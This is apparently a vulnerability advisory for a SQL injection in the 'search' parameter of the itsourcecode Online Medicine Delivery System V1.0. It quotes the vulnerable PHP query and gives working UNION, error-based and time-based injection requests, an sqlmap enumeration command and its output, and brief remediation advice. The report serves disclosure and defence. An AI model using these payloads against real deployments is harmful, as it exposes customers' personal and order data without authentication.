# itsourcecode Online Medicine Delivery System V1.0 SQL Injection Vulnerability via 'search' Parameter in '/index.php?q=product'
---

## 1. Product Information
| Field | Value |
| --- | --- |
| **Product Name** | Online Medicine Delivery System |
| **Product Link** | [https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/](https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/) |
| **Vendor** | itsourcecode |
| **Affected Version** | V1.0 |
| **Authentication Required** | No, exploitable without any authentication |


## 2. Vulnerability Type
**SQL Injection**

---

## 3. Vulnerability Description
The product search interface `/index.php?q=product` of Online Medicine Delivery System contains an SQL injection vulnerability. The interface receives the user-submitted `search` parameter and directly concatenates it into a `LIKE` fuzzy query SQL statement without any filtering or escaping. Since the query results are rendered directly to the product listing page via `loadResultList()`, an attacker can use UNION injection to echo arbitrary data onto the page.

The particularity of this vulnerability is that the injection point is within the `LIKE '%{$_POST['search']}%'` clause. The attacker needs to first close the `%'` parenthesis and single quote before appending the injection statement, but essentially it is no different from a regular string-type injection. This vulnerability can be exploited without any prior authentication.

**Affected Code**:

`menu.php:14-17`

```php
if(isset($_POST['search'])) { 
   $query = "SELECT * FROM `tblpromopro` pr , `tblproduct` p , `tblcategory` c
             WHERE pr.`PROID`=p.`PROID` AND  p.`CATEGID` = c.`CATEGID`  AND PROQTY>0 
   AND ( `CATEGORIES` LIKE '%{$_POST['search']}%' OR `PRONAME` LIKE '%{$_POST['search']}%' or `PROQTY` LIKE '%{$_POST['search']}%' or `PROPRICE` LIKE '%{$_POST['search']}%')";
}
```

---

## 4. Impact
+ **Full Database Data Disclosure**: Through UNION injection, arbitrary data from any database and any table can be directly echoed onto the product listing page, including user password hashes, customer personal information, order data, etc.
+ **No Authentication Required**: This interface is a frontend product search feature, accessible and exploitable without any login
+ **Multiple Injection Methods**: Supports 4 injection types (Boolean-based blind, Error-based, Time-based blind, UNION query injection), representing a very broad attack surface

---

## 5. PoC
**UNION Query Injection (data echo)**:

```plain
POST /index.php?q=product HTTP/1.1
Host: onlinemedicinedeliverysystem:9715
Content-Type: application/x-www-form-urlencoded
Connection: close

search=test') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b6b7a71,0x757541526a65626c4350456851626c526e6d69646c726c46715a62544a5455665665744f5a4d6469,0x7170716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```

**Error-based Injection**:

```plain
POST /index.php?q=product HTTP/1.1
Host: onlinemedicinedeliverysystem:9715
Content-Type: application/x-www-form-urlencoded
Connection: close

search=-1396') OR 1 GROUP BY CONCAT(0x716b6b7a71,(SELECT (CASE WHEN (5987=5987) THEN 1 ELSE 0 END)),0x7170716b71,FLOOR(RAND(0)*2)) HAVING MIN(0)#
```

**Time-based Blind Injection**:

```plain
POST /index.php?q=product HTTP/1.1
Host: onlinemedicinedeliverysystem:9715
Content-Type: application/x-www-form-urlencoded
Connection: close

search=test') AND (SELECT 8830 FROM (SELECT(SLEEP(5)))yEmt) AND ('piCX'='piCX
```

**sqlmap database enumeration**:

```bash
python sqlmap.py -u "http://<domain:port>/index.php?q=product" --data="search=test" -p search --batch --dbs --dbms=mysql
```

Result:

```plain
available databases [6]:
[*] information_schema
[*] medicinedb
[*] mysql
[*] performance_schema
[*] roocms
[*] sys
```

sqlmap execution screenshot:

![image-20260716192616949](C:\Users\Shawn\AppData\Roaming\Typora\typora-user-images\image-20260716192616949.png)



---

## 6. Remediation
1. **Use Parameterized Queries**
2. **Input Validation**: Perform character whitelist validation on search keywords, limiting the allowed character range

